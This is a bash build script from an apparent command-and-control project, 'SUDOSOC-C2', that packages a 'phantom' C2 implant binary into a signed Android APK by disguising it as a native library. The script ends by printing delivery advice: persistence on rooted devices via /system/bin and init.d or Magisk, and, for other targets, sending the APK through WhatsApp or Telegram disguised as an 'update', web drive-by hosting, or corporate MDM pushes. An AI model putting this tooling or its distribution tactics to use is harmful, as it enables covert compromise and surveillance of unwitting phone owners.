#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
# SUDOSOC-C2 — Android APK Builder
# Copyright (C) 2026  sudosoc — Seif
#
# Usage:
#   ./build_apk.sh <phantom_binary>
#
# Requirements:
#   - Android SDK (ANDROID_HOME set)
#   - Java JDK 11+
#   - aapt / aapt2 (in $ANDROID_HOME/build-tools/<version>/)
#   - zipalign, apksigner
#   - Optional: apktool (for repackaging)
#
# For quick testing without SDK:
#   Use adb push + adb shell (no APK needed for rooted devices)
# ═══════════════════════════════════════════════════════════════════

set -euo pipefail

BINARY="${1:-phantom_android_arm64}"
APK_NAME="phantom_android.apk"
WORK_DIR="/tmp/phantom_apk_build"
MANIFEST="$(dirname "$0")/AndroidManifest.xml"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

info()  { echo -e "${GREEN}[*]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[!]${NC} $1"; exit 1; }

# ── Validate prerequisites ───────────────────────────────────────────
[ -f "$BINARY" ] || error "Binary not found: $BINARY"
[ -f "$MANIFEST" ] || error "AndroidManifest.xml not found: $MANIFEST"

if [ -z "${ANDROID_HOME:-}" ]; then
    warn "ANDROID_HOME not set — attempting to find SDK"
    for p in \
        ~/Android/Sdk \
        /opt/android-sdk \
        /usr/local/android-sdk \
        /usr/lib/android-sdk \
        /usr/share/android-sdk \
        /opt/android; do
        if [ -d "$p" ]; then
            export ANDROID_HOME="$p"
            info "Found SDK at $ANDROID_HOME"
            break
        fi
    done
fi

if [ ! -d "${ANDROID_HOME:-}" ]; then
    error "Android SDK not found. Try: sudo apt install android-sdk android-sdk-build-tools"
fi

# Find build-tools version
BUILD_TOOLS=$(ls "$ANDROID_HOME/build-tools/" | sort -V | tail -1)
BT="$ANDROID_HOME/build-tools/$BUILD_TOOLS"
info "Using build-tools: $BUILD_TOOLS"

# Find platform (android.jar)
PLATFORM=$(ls "$ANDROID_HOME/platforms/" | sort -V | tail -1)
ANDROID_JAR="$ANDROID_HOME/platforms/$PLATFORM/android.jar"
info "Using platform: $PLATFORM"

# ── Setup working directory ──────────────────────────────────────────
info "Setting up build directory: $WORK_DIR"
rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"/{res/mipmap-hdpi,lib/arm64-v8a,assets,classes}

# ── Copy binary as native library ───────────────────────────────────
info "Embedding binary as native library"
cp "$BINARY" "$WORK_DIR/lib/arm64-v8a/libphantom.so"
# Note: Android loads .so files automatically — we use this as a trick
# to bundle the Go binary inside the APK without aapt stripping it

# ── Create minimal icon ─────────────────────────────────────────────
# 1x1 pixel transparent PNG
python3 -c "
import struct, zlib
def png_chunk(type_, data):
    c = struct.pack('>I', len(data)) + type_ + data
    return c + struct.pack('>I', zlib.crc32(c[4:]) & 0xffffffff)
sig = b'\x89PNG\r\n\x1a\n'
ihdr = png_chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
idat = png_chunk(b'IDAT', zlib.compress(b'\x00\x00\x00\x00\x00'))
iend = png_chunk(b'IEND', b'')
open('$WORK_DIR/res/mipmap-hdpi/ic_launcher.png', 'wb').write(sig + ihdr + idat + iend)
"
info "Created placeholder icon"

# ── Compile resources ────────────────────────────────────────────────
info "Compiling resources with aapt"
"$BT/aapt" package -f -M "$MANIFEST" \
    -S "$WORK_DIR/res" \
    -I "$ANDROID_JAR" \
    -F "$WORK_DIR/unsigned_no_dex.apk" \
    "$WORK_DIR"

# ── Add native library to APK ────────────────────────────────────────
info "Adding native library to APK"
cd "$WORK_DIR"
cp unsigned_no_dex.apk "$APK_NAME.tmp"
zip -j "$APK_NAME.tmp" lib/arm64-v8a/libphantom.so > /dev/null
cd - > /dev/null

# ── Create minimal classes.dex (bootstrap) ──────────────────────────
info "Creating bootstrap DEX"
cat > "$WORK_DIR/Loader.java" << 'JAVA'
public class Loader {
    // Bootstrap class that extracts and executes the native binary
    // The actual C2 implant runs as a native process
    public static void main(String[] args) {
        System.exit(0);
    }
}
JAVA

javac -source 8 -target 8 -bootclasspath "$ANDROID_JAR" \
    "$WORK_DIR/Loader.java" -d "$WORK_DIR/classes" 2>/dev/null || warn "javac step skipped"

if [ -f "$BT/dx" ]; then
    "$BT/dx" --dex --output="$WORK_DIR/classes.dex" "$WORK_DIR/classes/" 2>/dev/null || \
        warn "dx step skipped — APK may need manual DEX"
fi

# ── Add DEX to APK ───────────────────────────────────────────────────
if [ -f "$WORK_DIR/classes.dex" ]; then
    info "Adding classes.dex to APK"
    cd "$WORK_DIR"
    zip -j "$APK_NAME.tmp" classes.dex > /dev/null
    cd - > /dev/null
fi

# ── Align APK ────────────────────────────────────────────────────────
info "Zipaligning APK"
"$BT/zipalign" -f 4 "$WORK_DIR/$APK_NAME.tmp" "$WORK_DIR/$APK_NAME.aligned"

# ── Generate debug keystore ──────────────────────────────────────────
KEYSTORE="$WORK_DIR/debug.keystore"
if [ ! -f "$KEYSTORE" ]; then
    info "Generating debug keystore"
    keytool -genkey -v \
        -keystore "$KEYSTORE" \
        -alias androiddebugkey \
        -keyalg RSA \
        -keysize 2048 \
        -validity 10000 \
        -storepass android \
        -keypass android \
        -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null
fi

# ── Sign APK ─────────────────────────────────────────────────────────
info "Signing APK"
"$BT/apksigner" sign \
    --ks "$KEYSTORE" \
    --ks-key-alias androiddebugkey \
    --ks-pass pass:android \
    --key-pass pass:android \
    --out "$APK_NAME" \
    "$WORK_DIR/$APK_NAME.aligned"

# ── Cleanup ──────────────────────────────────────────────────────────
rm -rf "$WORK_DIR"

# ── Summary ──────────────────────────────────────────────────────────
APK_SIZE=$(du -sh "$APK_NAME" | cut -f1)
echo ""
info "APK built successfully!"
info "File:  $APK_NAME ($APK_SIZE)"
echo ""
echo -e "${GREEN}══ Deployment Options ══════════════════════════════════════${NC}"
echo ""
echo "  Option 1 — ADB Install (debugging enabled):"
echo "    adb install -r $APK_NAME"
echo ""
echo "  Option 2 — Direct binary (rooted device, no APK needed):"
echo "    adb push $BINARY /data/local/tmp/phantom"
echo "    adb shell chmod +x /data/local/tmp/phantom"
echo "    adb shell /data/local/tmp/phantom &"
echo ""
echo "  Option 3 — Persistence on rooted device:"
echo "    adb push $BINARY /system/bin/phantom"
echo "    adb shell chmod 755 /system/bin/phantom"
echo "    # Add to /etc/init.d or use Magisk module"
echo ""
echo -e "${YELLOW}  Note: For non-rooted devices, install via:"${NC}
echo "    Social engineering — share via WhatsApp/Telegram as 'update'"
echo "    Web drive-by — host on a site, enable 'Unknown Sources'"
echo "    MDM solution — push via corporate MDM"
echo ""
